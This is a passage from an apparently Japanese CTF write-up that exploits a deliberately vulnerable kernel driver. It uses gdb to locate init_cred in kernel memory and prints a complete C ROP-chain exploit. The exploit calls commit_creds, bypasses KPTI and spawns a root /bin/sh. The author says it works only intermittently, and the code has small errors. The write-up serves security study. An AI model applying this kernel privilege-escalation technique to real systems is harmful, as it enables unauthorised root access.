	<span class="token punctuation">.</span>euid			<span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>egid			<span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>fsuid			<span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>fsgid			<span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>securebits		<span class="token operator">=</span> SECUREBITS_DEFAULT<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>cap_inheritable	<span class="token operator">=</span> CAP_EMPTY_SET<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>cap_permitted		<span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>cap_effective		<span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>cap_bset		<span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>user			<span class="token operator">=</span> INIT_USER<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>user_ns		<span class="token operator">=</span> <span class="token operator">&amp;</span>init_user_ns<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>group_info		<span class="token operator">=</span> <span class="token operator">&amp;</span>init_groups<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>ucounts		<span class="token operator">=</span> <span class="token operator">&amp;</span>init_ucounts<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<p>参考：<a href="https://github.com/torvalds/linux/blob/33f2b5785a2b6b0ed1948aafee60d3abb12f1e3a/kernel/cred.c#L41" target="_blank" rel="nofollow noopener noreferrer">linux/cred.c at 33f2b5785a2b6b0ed1948aafee60d3abb12f1e3a · torvalds/linux</a></p>
<p>初期化処理の中では、init<em>cred は real</em>cred と cred にそれぞれ格納されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token function">RCU_POINTER_INITIALIZER</span><span class="token punctuation">(</span>real_cred<span class="token punctuation">,</span> <span class="token operator">&amp;</span>init_cred<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token function">RCU_POINTER_INITIALIZER</span><span class="token punctuation">(</span>cred<span class="token punctuation">,</span> <span class="token operator">&amp;</span>init_cred<span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre></div>
<p>これらは sched.h で定義されており、カーネルのヒープ領域に保存されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/* Process credentials: */</span>

<span class="token comment">/* Tracer's credentials at attach: */</span>
<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>

<span class="token comment">/* Objective and real subjective task credentials (COW): */</span>
<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>real_cred<span class="token punctuation">;</span>

<span class="token comment">/* Effective (overridable) subjective task credentials (COW): */</span>
<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>cred<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>
<span class="token comment">/* Cached requested key. */</span>
<span class="token keyword">struct</span> <span class="token class-name">key</span>			<span class="token operator">*</span>cached_requested_key<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token comment">/*
 * executable name, excluding path.
 *
 * - normally initialized setup_new_exec()
 * - access it with [gs]et_task_comm()
 * - lock it with task_lock()
 */</span>
<span class="token keyword">char</span>				comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">nameidata</span>		<span class="token operator">*</span>nameidata<span class="token punctuation">;</span></code></pre></div>
<p>参考：<a href="https://github.com/torvalds/linux/blob/64569520920a3ca5d456ddd9f4f95fc6ea9b8b45/include/linux/sched.h#L1057" target="_blank" rel="nofollow noopener noreferrer">linux/sched.h at 64569520920a3ca5d456ddd9f4f95fc6ea9b8b45 · torvalds/linux</a></p>
<p>つまり、カーネルのヒープアドレスを特定してメモリ内で init<em>cred のバイト列を検索することで init</em>cred のアドレスを特定することができるようになります。</p>
<p>ヒープアドレスの上手い特定方法はわかりませんでしたが、今回はヒープアドレスを持つ適当な構造体のメモリを参照することで特定しました。</p>
<p>今回利用した構造体は tty_struct です。</p>
<p>tty<em>struct のアドレス特定には、alloc</em>tty_struct 関数を利用しました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span><span class="token function">alloc_tty_struct</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">;</span>

	tty <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL_ACCOUNT<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tty<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">kref_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-></span>kref<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">tty_ldisc_init</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">kfree</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span></code></pre></div>
<p>参考：<a href="https://github.com/torvalds/linux/blob/64569520920a3ca5d456ddd9f4f95fc6ea9b8b45/drivers/tty/tty_io.c#L64" target="_blank" rel="nofollow noopener noreferrer">linux/tty_io.c at 64569520920a3ca5d456ddd9f4f95fc6ea9b8b45 · torvalds/linux</a></p>
<p>まずは、alloc<em>tty</em>struct のロードアドレスを特定し、gdb でアセンブルします。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token function">cat</span> /proc/kallsyms <span class="token operator">|</span> <span class="token function">grep</span> tty_struct
ffffffff813c9750 T __pfx_alloc_tty_struct
ffffffff813c9760 T alloc_tty_struct

$ x/100i 0xffffffff813c9760
   0xffffffff813c9760:  nop    WORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>
   0xffffffff813c9764:  push   rbp
   0xffffffff813c9765:  mov    edx,0x2b8
   0xffffffff813c976a:  mov    rbp,rsp
   0xffffffff813c976d:  push   r14
   0xffffffff813c976f:  push   r13
   0xffffffff813c9771:  mov    r13d,esi
   0xffffffff813c9774:  mov    esi,0x400dc0
   0xffffffff813c9779:  push   r12
   0xffffffff813c977b:  push   rbx
   0xffffffff813c977c:  mov    rbx,rdi
   0xffffffff813c977f:  sub    rsp,0x10
   0xffffffff813c9783:  mov    rdi,QWORD PTR <span class="token punctuation">[</span>rip+0x8627a6<span class="token punctuation">]</span>        <span class="token comment"># 0xffffffff81c2bf30</span>
   0xffffffff813c978a:  mov    rax,QWORD PTR gs:0x28
   0xffffffff813c9793:  mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x28<span class="token punctuation">]</span>,rax
   0xffffffff813c9797:  xor    eax,eax
   0xffffffff813c9799:  call   0xffffffff8114f9b0
   0xffffffff813c979e:  mov    r12,rax
   0xffffffff813c97a1:  <span class="token builtin class-name">test</span>   rax,rax
   0xffffffff813c97a4:  je     0xffffffff813c99b6
   0xffffffff813c97aa:  mov    DWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>,0x1</code></pre></div>
<p>前述のソースコードと対応させて考えると、恐らく<code class="language-text">mov    rdi,QWORD PTR [rip+0x8627a6]</code> でロードしているアドレス 0xffffffff81c2bf30 が tty_struct のアドレスだと推察できます。</p>
<p>tty<em>struct  では 0x10 オフセット目の `struct tty</em>driver *driver;` がヒープアドレスになる(らしい)ので、今回のヒープのベースアドレスを 0xffff8880024419c0 と仮定します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 821px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/02cd5/image-20230610125032985.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 19.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQY04WOTQ/BQBRFu6JEVRfCBh1aQnRaShkllNZHJIhGQsT//xlXZ0KIjcWZSc57c+9IvupipHlYmBsERoS1MUU82OExj3GfnRHWGYKqh17OBCtaWOnjZMcX94qM4Sot2JkGnKwhkJz8BKyyBS1v0FZ9WGmCkDCcnDWukyMu3h5HO0JfaWJZG+FAQ9y4H+7FbFjogMr1TyCTdSxLFJ7WgS0TIXmjlSJi8Q13wieFnG/3fiMCaXJ008nw1fL9/X/8hnGeVhl1999h+LMAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/8ac56/image-20230610125032985.webp 240w,
/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/d3be9/image-20230610125032985.webp 480w,
/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/d77d0/image-20230610125032985.webp 821w"
              sizes="(max-width: 821px) 100vw, 821px"
              type="image/webp"
            />
          <source
            srcset="/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/8ff5a/image-20230610125032985.png 240w,
/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/e85cb/image-20230610125032985.png 480w,
/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/02cd5/image-20230610125032985.png 821w"
            sizes="(max-width: 821px) 100vw, 821px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/bedbe6283a5a57300bfa3dd4e8c4d2c6/02cd5/image-20230610125032985.png"
            alt="image-20230610125032985"
            title="image-20230610125032985"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>参考：<a href="https://www.youtube.com/watch?v=HtdriW7KVNE&#x26;ab_channel=RPISEC" target="_blank" rel="nofollow noopener noreferrer">Kernel Exploitation - YouTube</a></p>
<p>参考：<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628" target="_blank" rel="nofollow noopener noreferrer">Kernel Exploitで使える構造体集 - CTFするぞ</a></p>
<p>ここで、gdb を使用して以下のようにカーネルのヒープ領域内で init_cred のバイト列を探索します。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> find <span class="token operator">/</span>g <span class="token number">0xffff8880024419c0</span><span class="token punctuation">,</span><span class="token number">0xffff88800fffffff</span><span class="token punctuation">,</span><span class="token number">0x0000000000000004</span><span class="token punctuation">,</span><span class="token number">0x0000000000000000</span><span class="token punctuation">,</span><span class="token number">0x0000000000000000</span><span class="token punctuation">,</span><span class="token number">0x0000000000000000</span><span class="token punctuation">,</span><span class="token number">0x0000000000000000</span><span class="token punctuation">,</span><span class="token number">0x0000000000000000</span><span class="token punctuation">,</span><span class="token number">0x000001ffffffffff</span>
<span class="token comment">// 省略</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x<span class="token operator">/</span><span class="token number">21</span>gx <span class="token number">0xffff88800321d780</span>
<span class="token number">0x0000000000000004</span>      
<span class="token number">0x0000000000000000</span>
<span class="token number">0x0000000000000000</span>      
<span class="token number">0x0000000000000000</span>
<span class="token number">0x0000000000000000</span>     
<span class="token number">0x0000000000000000</span>
<span class="token number">0x000001ffffffffff</span>      
<span class="token number">0x000001ffffffffff</span>
<span class="token number">0x000001ffffffffff</span>      
<span class="token number">0x0000000000000000</span>
<span class="token number">0xffffffff81e38bc0</span>      
<span class="token number">0xffffffff81e38c60</span>
<span class="token number">0xffffffff81e39f00</span>      
<span class="token number">0xffffffff81e396c0</span>
<span class="token number">0x0000000000000000</span>      
<span class="token number">0x0000000000000000</span>
<span class="token number">0x0000000000000001</span>
<span class="token number">0xffff888003252900</span>
<span class="token number">0xffff8880030e0bc8</span>      
<span class="token number">0xffff888003252f18</span>
<span class="token number">0x0000000000000000</span></code></pre></div>
<p>その結果、0xffff88800321d780 に init_cred のものとみられるバイト列が確保されていることを特定できました。</p>
<h3 id="root-シェルを取得する" style="position:relative;"><a href="#root-%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B" aria-label="root シェルを取得する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>root シェルを取得する</h3>
<p>以上の結果を元に、以下のようなエクスプロイトコードを作成しました。</p>
<p>TARGET には、Ghidra と gdb で特定した CTF4B<em>IOCTL</em>LOAD 呼び出し時の ret が参照する rsp のアドレスを指定しています。</p>
<p>これにより、AAW の脆弱性を突いてスタック領域に作成した ROP ガジェットを配置できます。</p>
<p>今回の環境では SMEP と SMAP は無効化されていますので、ROP ガジェットや save_state 関数はユーザ空間で定義したものを使用できました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_DEVICE_NAME</span> <span class="token string">"ctf4b"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_STORE</span> <span class="token expression"><span class="token number">0xC7F4B00</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_LOAD</span>  <span class="token expression"><span class="token number">0xC7F4B01</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_MSG_SIZE</span> <span class="token expression"><span class="token number">0x100</span></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rsp<span class="token punctuation">,</span> user_rflags<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff81093d50</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> init_cred <span class="token operator">=</span> <span class="token number">0xffff88800321d780</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> rop_bypass_kpti <span class="token operator">=</span> <span class="token number">0xffffffff81801811</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff818017e0</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TARGET</span> <span class="token expression"><span class="token number">0xffffc9000017fea8</span></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Hello from user land!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">uid_t</span> uid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>uid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] UID: %d, got root!\n"</span><span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] UID: %d, we root-less :(!\n"</span><span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">asm</span><span class="token punctuation">(</span>
      <span class="token string">"movq %%cs, %0\n"</span>
      <span class="token string">"movq %%ss, %1\n"</span>
      <span class="token string">"movq %%rsp, %2\n"</span>
      <span class="token string">"pushfq\n"</span>
      <span class="token string">"popq %3\n"</span>
      <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span>
      <span class="token operator">:</span>
      <span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf4b"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf4b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> buf<span class="token punctuation">;</span>
    buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>CTF4B_MSG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>chain <span class="token operator">=</span> buf<span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> rop_pop_rdi<span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> init_cred<span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> commit_creds<span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> rop_bypass_kpti<span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span> <span class="token comment">// [rdi]</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>win<span class="token punctuation">;</span> <span class="token comment">// [rdi+0x10]</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>             <span class="token comment">// [rdi+0x18]</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>         <span class="token comment">// [rdi+0x20]</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_rsp<span class="token punctuation">;</span>            <span class="token comment">// [rdi+0x28]</span>
    <span class="token operator">*</span>chain<span class="token operator">++</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>             <span class="token comment">// [rdi+0x30]</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_STORE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_LOAD<span class="token punctuation">,</span> TARGET<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>どうも release 環境だと TARGET で指定している ret 時のスタックポインタのアドレスが微妙に変わる場合があり、エクスプロイトは通ったり通らなかったりしますが、上手く動くタイミングだと以下のように root ユーザのシェルに昇格させることができるようになります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 481px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/80a8383f9e9e0cdf9546c503d027896a/d024a/image-20230610114143821.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 58.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABs0lEQVQoz41SWU/CYBDUeIAm3hrxCBXEUI5SoLSWUigIFMqpqDFgfNFXH/3/47eblKCpx8Nk222/2Zn5dumu0EE9quPR6MM5L2GstuFe2eilHDyUeqLWkQvFoW5cMug5F45DCcW4Ui+/mZjXpfJRDtf7GfjVPFRQPSkwee1MgyX6pR0Z2lYSRQHzIAuD/1dg7KW555Mx4dQa4zbfFnDRipXRiBrop+sg5aNci5U/lUf8TqrdRAWteJn77csKC1HDC4RkiVTRB19V88LkyWTLt+ODrYZ+sdwRebkJm5U5gozserLDNtMrUWRWCRKy6xfzAd/xxfJzdYIX5x7tuCWsWGx9kL0RdiwMMg3cax6GSpPt98QgVagKIp0TDsXhZszEW2fGJJVjlSOgwKsnRdRONdhCtd9bVBNI6CVrrIJUenINk2KHV+VB77EiUkZD/ewWMw0kpJ171Pt8EXYkzySUK733hWV9N/VjXoGEk2IXT+aQ7dKlkEVaCyKkKG6k6y+79ifhqzvFx+wdDcngS6E9I8tUuyIOUqtty38SzQntiFgTcVBePoeyHuP18FeFsSb9Wx3hE77UZ0NuD2KKAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/80a8383f9e9e0cdf9546c503d027896a/8ac56/image-20230610114143821.webp 240w,
/static/80a8383f9e9e0cdf9546c503d027896a/d3be9/image-20230610114143821.webp 480w,
/static/80a8383f9e9e0cdf9546c503d027896a/1c567/image-20230610114143821.webp 481w"
              sizes="(max-width: 481px) 100vw, 481px"
              type="image/webp"
            />
          <source
            srcset="/static/80a8383f9e9e0cdf9546c503d027896a/8ff5a/image-20230610114143821.png 240w,
/static/80a8383f9e9e0cdf9546c503d027896a/e85cb/image-20230610114143821.png 480w,
/static/80a8383f9e9e0cdf9546c503d027896a/d024a/image-20230610114143821.png 481w"
            sizes="(max-width: 481px) 100vw, 481px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/80a8383f9e9e0cdf9546c503d027896a/d024a/image-20230610114143821.png"
            alt="image-20230610114143821"
            title="image-20230610114143821"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>あまりにもエクスプロイトの成功率がまちまちなので何か間違っているのかもしれませんが通ったのでヨシ！</p>
<p>ret 時に参照しているスタックのアドレスはカーネルの再起動をするまでは不変のようなので、もしかしたら本来は AAR とかを駆使して一度スタックのアドレスをリークさせてからエクスプロイトをかける必要があるのかもしれません。</p>
